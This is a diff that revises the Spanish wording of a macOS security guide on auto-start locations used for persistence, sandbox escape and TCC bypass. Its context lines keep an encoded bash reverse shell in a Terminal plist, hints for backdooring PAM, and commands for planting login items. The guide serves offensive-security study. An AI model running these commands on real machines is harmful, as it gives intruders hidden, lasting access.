@@ -85,7 +85,7 @@ Lista todos los agentes y daemons cargados por el usuario actual:
 launchctl list
 ```
 > [!WARNING]
-> Si un plist es propiedad de un usuario, incluso si está en carpetas de sistema de demonios, **la tarea se ejecutará como el usuario** y no como root. Esto puede prevenir algunos ataques de escalada de privilegios.
+> Si un plist es propiedad de un usuario, incluso si está en carpetas de sistema de demonios, la **tarea se ejecutará como el usuario** y no como root. Esto puede prevenir algunos ataques de escalada de privilegios.
 
 #### Más información sobre launchd
 
@@ -150,7 +150,7 @@ echo "touch /tmp/hacktricks" >> ~/.zshrc
 ### Aplicaciones Reabiertas
 
 > [!CAUTION]
-> Configurar la explotación indicada y cerrar sesión e iniciar sesión o incluso reiniciar no funcionó para mí para ejecutar la aplicación. (La aplicación no se estaba ejecutando, tal vez necesita estar en ejecución cuando se realizan estas acciones)
+> Configurar la explotación indicada y cerrar sesión e iniciar sesión o incluso reiniciar no funcionó para mí para ejecutar la aplicación. (La aplicación no se estaba ejecutando, tal vez necesita estar en funcionamiento cuando se realizan estas acciones)
 
 **Escritura**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)
 
@@ -223,7 +223,7 @@ Esta configuración se refleja en el archivo **`~/Library/Preferences/com.apple.
 ```
 Entonces, si el plist de las preferencias del terminal en el sistema pudiera ser sobrescrito, la funcionalidad **`open`** se puede usar para **abrir el terminal y ese comando se ejecutará**.
 
-Puedes agregar esto desde la cli con:
+Puedes agregar esto desde la línea de comandos con:
 ```bash
 # Add
 /usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
@@ -275,10 +275,10 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
-Podrías también usar las extensiones **`.command`**, **`.tool`**, con contenido de scripts de shell regulares y también serán abiertos por Terminal.
+Podrías también usar las extensiones **`.command`**, **`.tool**, con contenido de scripts de shell regulares y también serán abiertos por Terminal.
 
 > [!CAUTION]
-> Si el terminal tiene **Acceso Completo al Disco** podrá completar esa acción (ten en cuenta que el comando ejecutado será visible en una ventana de terminal).
+> Si el terminal tiene **Acceso Completo al Disco**, podrá completar esa acción (ten en cuenta que el comando ejecutado será visible en una ventana de terminal).
 
 ### Plugins de Audio
 
@@ -286,7 +286,7 @@ Escritura: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit
 Escritura: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
 
 - Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Elusión de TCC: [🟠](https://emojipedia.org/large-orange-circle)
+- Bypass de TCC: [🟠](https://emojipedia.org/large-orange-circle)
 - Podrías obtener acceso adicional a TCC
 
 #### Ubicación
@@ -312,7 +312,7 @@ Según las escrituras anteriores, es posible **compilar algunos plugins de audio
 Escritura: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)
 
 - Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Elusión de TCC: [🟠](https://emojipedia.org/large-orange-circle)
+- Bypass de TCC: [🟠](https://emojipedia.org/large-orange-circle)
 - Podrías obtener acceso adicional a TCC
 
 #### Ubicación
@@ -332,12 +332,12 @@ Es posible compilar tu propio plugin de QuickLook, colocarlo en una de las ubica
 ### ~~Hooks de Inicio/Cierre de Sesión~~
 
 > [!CAUTION]
-> Esto no funcionó para mí, ni con el LoginHook del usuario ni con el LogoutHook de root
+> Esto no funcionó para mí, ni con el LoginHook de usuario ni con el LogoutHook de root
 
 **Escritura**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)
 
 - Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Elusión de TCC: [🔴](https://emojipedia.org/large-red-circle)
+- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Ubicación
 
@@ -376,7 +376,7 @@ El usuario root se almacena en **`/private/var/root/Library/Preferences/com.appl
 ## Bypass de Sandbox Condicional
 
 > [!TIP]
-> Aquí puedes encontrar ubicaciones de inicio útiles para **bypass de sandbox** que te permiten simplemente ejecutar algo **escribiéndolo en un archivo** y **esperando condiciones no muy comunes** como programas **específicos instalados, acciones de usuario "poco comunes"** o entornos.
+> Aquí puedes encontrar ubicaciones de inicio útiles para **bypass de sandbox** que te permiten simplemente ejecutar algo **escribiéndolo en un archivo** y **esperando condiciones no tan comunes** como programas específicos **instalados, acciones de usuario "poco comunes"** o entornos.
 
 ### Cron
 
@@ -548,7 +548,7 @@ EOF
 - Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
 - Solicita permisos de Automatización-Creación de accesos directos y Accesibilidad
 
-#### Location
+#### Ubicación
 
 - `~/Library/Application Support/BetterTouchTool/*`
 
@@ -561,7 +561,7 @@ Esta herramienta permite indicar aplicaciones o scripts a ejecutar cuando se pre
 - Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
 - Solicita permisos de Automatización, Accesibilidad e incluso acceso a Disco Completo
 
-#### Location
+#### Ubicación
 
 - `???`
 
@@ -569,53 +569,53 @@ Permite crear flujos de trabajo que pueden ejecutar código cuando se cumplen ci
 
 ### SSHRC
 
-Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)
+Escritura: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)
 
 - Útil para eludir la sandbox: [✅](https://emojipedia.org/check-mark-button)
 - Pero ssh necesita estar habilitado y ser utilizado
 - Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
 - El uso de SSH requiere acceso FDA
 
-#### Location
+#### Ubicación
 
 - **`~/.ssh/rc`**
-- **Trigger**: Inicio de sesión a través de ssh
+- **Disparador**: Inicio de sesión a través de ssh
 - **`/etc/ssh/sshrc`**
 - Se requiere root
-- **Trigger**: Inicio de sesión a través de ssh
+- **Disparador**: Inicio de sesión a través de ssh
 
 > [!CAUTION]
-> Para activar ssh se requiere Acceso Completo al Disco:
+> Para activar ssh se requiere Acceso a Disco Completo:
 >
 > ```bash
 > sudo systemsetup -setremotelogin on
 > ```
 
-#### Description & Exploitation
+#### Descripción y Explotación
 
 Por defecto, a menos que `PermitUserRC no` en `/etc/ssh/sshd_config`, cuando un usuario **inicia sesión a través de SSH** los scripts **`/etc/ssh/sshrc`** y **`~/.ssh/rc`** se ejecutarán.
 
-### **Login Items**
+### **Elementos de Inicio de Sesión**
 
-Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)
+Escritura: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)
 
 - Útil para eludir la sandbox: [✅](https://emojipedia.org/check-mark-button)
 - Pero necesitas ejecutar `osascript` con argumentos
 - Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Locations
+#### Ubicaciones
 
 - **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
-- **Trigger:** Inicio de sesión
+- **Disparador:** Inicio de sesión
 - Carga útil de explotación almacenada llamando a **`osascript`**
 - **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
-- **Trigger:** Inicio de sesión
+- **Disparador:** Inicio de sesión
 - Se requiere root
 
-#### Description
+#### Descripción
 
-En Preferencias del Sistema -> Usuarios y Grupos -> **Elementos de inicio de sesión** puedes encontrar **elementos que se ejecutarán cuando el usuario inicie sesión**.\
-Es posible listarlos, agregar y eliminar desde la línea de comandos:
+En Preferencias del Sistema -> Usuarios y Grupos -> **Elementos de Inicio de Sesión** puedes encontrar **elementos que se ejecutarán cuando el usuario inicie sesión**.\
+Es posible listarlos, agregarlos y eliminarlos desde la línea de comandos:
 ```bash
 #List all items:
 osascript -e 'tell application "System Events" to get the name of every login item'
@@ -739,7 +739,7 @@ Escritura: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-
 
 #### Descripción y Explotación
 
-Las Acciones de Carpeta son scripts que se activan automáticamente por cambios en una carpeta, como agregar o eliminar elementos, o otras acciones como abrir o redimensionar la ventana de la carpeta. Estas acciones pueden ser utilizadas para diversas tareas y pueden ser activadas de diferentes maneras, como usando la interfaz de Finder o comandos de terminal.
+Las Acciones de Carpeta son scripts que se activan automáticamente por cambios en una carpeta, como agregar o eliminar elementos, o otras acciones como abrir o redimensionar la ventana de la carpeta. Estas acciones se pueden utilizar para diversas tareas y se pueden activar de diferentes maneras, como usando la interfaz de Finder o comandos de terminal.
 
 Para configurar las Acciones de Carpeta, tienes opciones como:
 
@@ -748,7 +748,7 @@ Para configurar las Acciones de Carpeta, tienes opciones como:
 3. Utilizar OSAScript para enviar mensajes de Apple Event a `System Events.app` para configurar programáticamente una Acción de Carpeta.
 - Este método es particularmente útil para incrustar la acción en el sistema, ofreciendo un nivel de persistencia.
 
-El siguiente script es un ejemplo de lo que puede ser ejecutado por una Acción de Carpeta:
+El siguiente script es un ejemplo de lo que se puede ejecutar mediante una Acción de Carpeta:
 ```applescript
 // source.js
 var app = Application.currentApplication();
@@ -973,7 +973,7 @@ Escritura: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https:/
 
 #### Descripción y Explotación
 
-Crea un nuevo proyecto en Xcode y selecciona la plantilla para generar un nuevo **Protector de Pantalla**. Luego, agrega tu código a él, por ejemplo, el siguiente código para generar registros.
+Crea un nuevo proyecto en Xcode y selecciona la plantilla para generar un nuevo **Protector de Pantalla**. Luego, agrega tu código, por ejemplo, el siguiente código para generar registros.
 
 **Compílalo**, y copia el paquete `.saver` a **`~/Library/Screen Savers`**. Luego, abre la GUI del Protector de Pantalla y si simplemente haces clic en él, debería generar muchos registros:
 ```bash
@@ -1057,10 +1057,10 @@ NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
 
 writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)
 
-- Útil para eludir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-- Pero terminarás en un sandbox de aplicación
+- Útil para eludir la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Pero terminarás en una sandbox de aplicación
 - Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
-- El sandbox parece muy limitado
+- La sandbox parece muy limitada
 
 #### Location
 
@@ -1074,14 +1074,14 @@ writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.g
 - Se requiere root
 - `Some.app/Contents/Library/Spotlight/`
 - **Trigger**: Se crea un nuevo archivo con una extensión gestionada por el plugin de spotlight.
-- Se requiere una nueva aplicación
+- Se requiere nueva app
 
 #### Description & Exploitation
 
 Spotlight es la función de búsqueda integrada de macOS, diseñada para proporcionar a los usuarios **acceso rápido y completo a los datos en sus computadoras**.\
 Para facilitar esta capacidad de búsqueda rápida, Spotlight mantiene una **base de datos propietaria** y crea un índice mediante **el análisis de la mayoría de los archivos**, lo que permite búsquedas rápidas a través de nombres de archivos y su contenido.
 
-El mecanismo subyacente de Spotlight implica un proceso central llamado 'mds', que significa **'servidor de metadatos'.** Este proceso orquesta todo el servicio de Spotlight. Complementando esto, hay múltiples demonios 'mdworker' que realizan una variedad de tareas de mantenimiento, como indexar diferentes tipos de archivos (`ps -ef | grep mdworker`). Estas tareas son posibles gracias a los plugins importadores de Spotlight, o **".mdimporter bundles**", que permiten a Spotlight entender e indexar contenido en una amplia gama de formatos de archivo.
+El mecanismo subyacente de Spotlight implica un proceso central llamado 'mds', que significa **'servidor de metadatos'.** Este proceso orquesta todo el servicio de Spotlight. Complementando esto, hay múltiples demonios 'mdworker' que realizan una variedad de tareas de mantenimiento, como indexar diferentes tipos de archivos (`ps -ef | grep mdworker`). Estas tareas son posibles gracias a los plugins importadores de Spotlight, o **".mdimporter bundles**", que permiten a Spotlight entender e indexar contenido a través de una amplia gama de formatos de archivo.
 
 Los plugins o **`.mdimporter`** bundles se encuentran en los lugares mencionados anteriormente y si aparece un nuevo bundle, se carga en un minuto (no es necesario reiniciar ningún servicio). Estos bundles deben indicar qué **tipo de archivo y extensiones pueden gestionar**, de esta manera, Spotlight los utilizará cuando se cree un nuevo archivo con la extensión indicada.
 
@@ -1131,7 +1131,7 @@ plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 [...]
 ```
 > [!CAUTION]
-> Si revisas el Plist de otros `mdimporter`, es posible que no encuentres la entrada **`UTTypeConformsTo`**. Eso se debe a que es un _Identificador de Tipo Uniforme_ incorporado ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) y no necesita especificar extensiones.
+> Si revisas el Plist de otros `mdimporter`, es posible que no encuentres la entrada **`UTTypeConformsTo`**. Eso es porque es un _Identificador de Tipo Uniforme_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) incorporado y no necesita especificar extensiones.
 >
 > Además, los plugins predeterminados del sistema siempre tienen prioridad, por lo que un atacante solo puede acceder a archivos que no están indexados por los propios `mdimporters` de Apple.
 
@@ -1239,7 +1239,7 @@ Escritura: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit
 
 #### Ubicación
 
-- Root siempre requerido
+- Se requiere root siempre
 
 #### Descripción y Explotación
 
@@ -1269,7 +1269,7 @@ Y por lo tanto, cualquier intento de usar **`sudo` funcionará**.
 > [!CAUTION]
 > Tenga en cuenta que este directorio está protegido por TCC, por lo que es muy probable que el usuario reciba un aviso pidiendo acceso.
 
-Otro buen ejemplo es su, donde se puede ver que también es posible dar parámetros a los módulos PAM (y también podría poner una puerta trasera en este archivo):
+Otro buen ejemplo es su, donde puedes ver que también es posible dar parámetros a los módulos PAM (y también podrías poner una puerta trasera en este archivo):
 ```bash
 cat /etc/pam.d/su
 # su: auth account session
@@ -1341,13 +1341,13 @@ Actívelo con:
 ```bash
 security authorize com.asdf.asdf
 ```
-Y luego el **grupo de personal debería tener** acceso sudo (lee `/etc/sudoers` para confirmar).
+Y luego el **grupo de personal debe tener** acceso sudo (lee `/etc/sudoers` para confirmar).
 
 ### Man.conf
 
 Escritura: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)
 
-- Útil para eludir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Útil para eludir sandbox: [🟠](https://emojipedia.org/large-orange-circle)
 - Pero necesitas ser root y el usuario debe usar man
 - Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
 
@@ -1386,7 +1386,7 @@ touch /tmp/manconf
 
 - **`/etc/apache2/httpd.conf`**
 - Se requiere root
-- Activación: Cuando Apache2 se inicia
+- Activador: Cuando Apache2 se inicia
 
 #### Descripción y Explotación
 
@@ -1394,7 +1394,7 @@ Puedes indicar en `/etc/apache2/httpd.conf` que cargue un módulo añadiendo una
 ```bash
 LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
 ```
-De esta manera, tu módulo compilado será cargado por Apache. La única cosa es que necesitas **firmarlo con un certificado de Apple válido**, o necesitas **agregar un nuevo certificado de confianza** en el sistema y **firmarlo** con él.
+De esta manera, tu módulo compilado será cargado por Apache. Lo único es que necesitas **firmarlo con un certificado de Apple válido**, o necesitas **agregar un nuevo certificado de confianza** en el sistema y **firmarlo** con él.
 
 Luego, si es necesario, para asegurarte de que el servidor se inicie, podrías ejecutar:
 ```bash
@@ -1424,7 +1424,7 @@ Escritura: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit
 
 - **`/etc/security/audit_warn`**
 - Se requiere root
-- **Activador**: Cuando auditd detecta una advertencia
+- **Disparador**: Cuando auditd detecta una advertencia
 
 #### Descripción y Explotación
 
@@ -1441,7 +1441,7 @@ Podrías forzar una advertencia con `sudo audit -n`.
 El **StartupItem** es un directorio que debe estar ubicado dentro de `/Library/StartupItems/` o `/System/Library/StartupItems/`. Una vez que se establece este directorio, debe contener dos archivos específicos:
 
 1. Un **script rc**: Un script de shell ejecutado al inicio.
-2. Un **archivo plist**, específicamente llamado `StartupParameters.plist`, que contiene varias configuraciones.
+2. Un **archivo plist**, específicamente nombrado `StartupParameters.plist`, que contiene varias configuraciones.
 
 Asegúrate de que tanto el script rc como el archivo `StartupParameters.plist` estén correctamente ubicados dentro del directorio **StartupItem** para que el proceso de inicio los reconozca y los utilice.
 
@@ -1517,7 +1517,7 @@ XQuartz **ya no está instalado en macOS**, así que si quieres más informació
 ### ~~kext~~
 
 > [!CAUTION]
-> Es tan complicado instalar kext incluso como root que no consideraré esto para escapar de sandboxes o incluso para persistencia (a menos que tengas un exploit)
+> Es tan complicado instalar kext incluso como root que no lo consideraré para escapar de sandboxes o incluso para persistencia (a menos que tengas un exploit)
 
 #### Ubicación
 
